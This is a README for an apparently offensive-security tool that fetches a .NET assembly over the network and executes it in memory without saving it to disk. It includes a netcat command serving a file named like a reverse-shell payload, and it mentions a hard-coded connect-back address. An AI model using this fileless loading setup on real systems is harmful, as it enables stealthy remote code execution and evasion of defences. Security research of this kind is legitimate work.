# DotnetFilelessExecution

## Overview

DotnetFilelessExecution is the very basic demonstration of how to fetch a .NET assembly remotely and the execute it on the client side directly in memory, i.e., without having to save the assembly on the disk.

## Compilation

I have used cross compilation but of course, Visual Studio can be used.

```bash
mcs -out:DotnetFilelessExecution.exe DotnetFilelessExecution.cs
```

## Usage

- Start a simple Netcat file sharing server, serving the .NET compiled assembly which you want to execute.

```bash
nc -nvlp 80 < winrev.exe
```

- Use DotnetFilelessExecution to execute it remotely in memory

```bash
.\DotnetFilelessExecution.exe
```

## Note
For demonstration purposes, the connect back address is hard coded inside the program, which can be changed as needed.

## Disclaimer
This project is intended for educational and security testing purposes only. The author is not responsible for any misuse of this tool.

## Author
Developed by **Sayan Ray** [@BareBones90](https://x.com/BareBones90)

## License
This project is licensed under the MIT License - see the LICENSE file for details.
